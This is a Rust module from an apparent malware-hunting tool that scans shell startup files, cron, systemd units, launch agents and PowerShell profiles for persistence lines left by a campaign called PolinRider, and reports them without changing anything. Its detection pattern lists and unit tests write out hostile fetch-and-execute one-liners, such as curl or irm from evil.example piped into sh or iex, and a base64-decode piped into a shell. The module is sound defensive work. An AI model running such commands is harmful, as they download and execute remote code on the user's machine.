//! Persistence outside the project tree.
//!
//! Detector opt-out marker: POLINRIDER-HUNTER-DETECTOR
//!
//! Cleaning a repository removes the loader's *delivery*. It says nothing about
//! whether the second stage arranged to come back on its own. The published
//! cleanup guidance for this campaign lists a set of places worth checking by
//! hand — shell startup files, cron, macOS launch agents, the PowerShell
//! profile — and "by hand" scales badly, so it is checked here instead.
//!
//! This module only ever *reports*. Rewriting somebody's `.zshrc` or removing a
//! cron entry unasked is a good way to break a machine in a way that is hard to
//! attribute, and these files are hand-maintained by definition. It names the
//! file, quotes the line and gets out of the way.

use std::path::{Path, PathBuf};

use crate::signatures;

#[derive(Debug, Clone)]
pub struct Hit {
    pub location: String,
    pub line_no: usize,
    /// The offending line, trimmed for display.
    pub line: String,
    pub why: &'static str,
}

/// Shapes that have no business in a startup file.
///
/// Each needs two parts to fire: fetching *and* executing. `curl` in a profile
/// is ordinary; `curl … | sh` is not. Requiring the pair is what keeps this from
/// flagging every developer's dotfiles.
const FETCH: &[&str] = &["curl ", "wget ", "Invoke-WebRequest", "Invoke-RestMethod", "irm ", "iwr "];
const EXEC: &[&str] = &["| sh", "|sh", "| bash", "|bash", "| iex", "|iex",
                        "Invoke-Expression", "eval ", "eval(", "node -e", "python -c"];

/// A line that both fetches and executes, or decodes and executes.
fn is_fetch_exec(line: &str) -> Option<&'static str> {
    let l = line.trim();
    if l.starts_with('#') || l.is_empty() {
        return None;
    }
    let fetches = FETCH.iter().any(|f| l.contains(f));
    let executes = EXEC.iter().any(|e| l.contains(e));
    if fetches && executes {
        return Some("downloads and executes in one step");
    }
    // base64 -d | sh, atob(...) + eval, and friends.
    let decodes = l.contains("base64 -d") || l.contains("base64 --decode")
        || l.contains("FromBase64String") || l.contains("atob(");
    if decodes && executes {
        return Some("decodes and executes a blob");
    }
    None
}

fn examine(path: &Path, why_file: &'static str, out: &mut Vec<Hit>) {
    let Ok(text) = std::fs::read_to_string(path) else {
        return;
    };
    for (i, line) in text.lines().enumerate() {
        let why = if signatures::has_critical(line.as_bytes()) {
            Some("carries a PolinRider indicator")
        } else {
            is_fetch_exec(line)
        };
        if let Some(why) = why {
            out.push(Hit {
                location: path.display().to_string(),
                line_no: i + 1,
                line: line.trim().chars().take(160).collect(),
                why: if why_file.is_empty() { why } else { why_file },
            });
        }
    }
}

fn home() -> Option<PathBuf> {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .ok()
        .map(PathBuf::from)
}

/// Everything worth looking at, on this platform.
pub fn check() -> Vec<Hit> {
    let mut out = Vec::new();
    let Some(h) = home() else { return out };

    // Shell startup files, on every platform — Git Bash and WSL make these
    // relevant on Windows too.
    for name in [
        ".bashrc", ".bash_profile", ".bash_login", ".profile",
        ".zshrc", ".zprofile", ".zshenv", ".kshrc",
        ".config/fish/config.fish",
    ] {
        examine(&h.join(name), "", &mut out);
    }

    #[cfg(windows)]
    {
        // The PowerShell profile is the Windows equivalent of .bashrc, and is
        // where a persistent one-liner would sit.
        for rel in [
            r"Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
            r"Documents\WindowsPowerShell\profile.ps1",
            r"Documents\PowerShell\Microsoft.PowerShell_profile.ps1",
            r"Documents\PowerShell\profile.ps1",
        ] {
            examine(&h.join(rel), "", &mut out);
        }
        // Anything dropped in Startup that is a script rather than a shortcut.
        if let Ok(appdata) = std::env::var("APPDATA") {
            let startup = PathBuf::from(appdata)
                .join(r"Microsoft\Windows\Start Menu\Programs\Startup");
            if let Ok(entries) = std::fs::read_dir(&startup) {
                for e in entries.flatten() {
                    let p = e.path();
                    let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("")
                        .to_ascii_lowercase();
                    if matches!(ext.as_str(), "vbs" | "js" | "bat" | "cmd" | "ps1") {
                        examine(&p, "", &mut out);
                    }
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        // Launch agents and daemons: the documented macOS persistence spots.
        for dir in [
            h.join("Library/LaunchAgents"),
            PathBuf::from("/Library/LaunchAgents"),
            PathBuf::from("/Library/LaunchDaemons"),
        ] {
            if let Ok(entries) = std::fs::read_dir(&dir) {
                for e in entries.flatten() {
                    examine(&e.path(), "", &mut out);
                }
            }
        }
    }

    #[cfg(unix)]
    {
        // systemd user units, and the crontab.
        let units = std::env::var("XDG_CONFIG_HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|_| h.join(".config"))
            .join("systemd/user");
        if let Ok(entries) = std::fs::read_dir(&units) {
            for e in entries.flatten() {
                examine(&e.path(), "", &mut out);
            }
        }
        let cron = crate::util::run("crontab", &["-l"]);
        if cron.ok {
            for (i, line) in cron.stdout.lines().enumerate() {
                let why = if signatures::has_critical(line.as_bytes()) {
                    Some("carries a PolinRider indicator")
                } else {
                    is_fetch_exec(line)
                };
                if let Some(why) = why {
                    out.push(Hit {
                        location: "crontab -l".into(),
                        line_no: i + 1,
                        line: line.trim().chars().take(160).collect(),
                        why,
                    });
                }
            }
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ordinary_dotfile_lines_are_left_alone() {
        for line in [
            "export PATH=\"$PATH:$HOME/.local/bin\"",
            "alias ll='ls -la'",
            "# curl is great",
            "source ~/.nvm/nvm.sh",
            "eval \"$(starship init zsh)\"",   // eval alone, nothing fetched
            "curl -o out.txt https://example.com", // fetch alone, nothing run
        ] {
            assert!(is_fetch_exec(line).is_none(), "false positive on: {line}");
        }
    }

    #[test]
    fn fetch_piped_into_a_shell_is_caught() {
        assert!(is_fetch_exec("curl -s https://evil.example/x | sh").is_some());
        assert!(is_fetch_exec("wget -qO- http://1.2.3.4/a|bash").is_some());
        assert!(is_fetch_exec("irm https://evil.example/p.ps1 | iex").is_some());
    }

    #[test]
    fn decode_then_execute_is_caught() {
        assert!(is_fetch_exec("echo aGk= | base64 -d | sh").is_some());
        assert!(is_fetch_exec("node -e \"eval(atob('...'))\"").is_some());
    }

    #[test]
    fn commented_out_lines_do_not_count() {
        assert!(is_fetch_exec("# curl https://x | sh").is_none());
        assert!(is_fetch_exec("").is_none());
    }
}
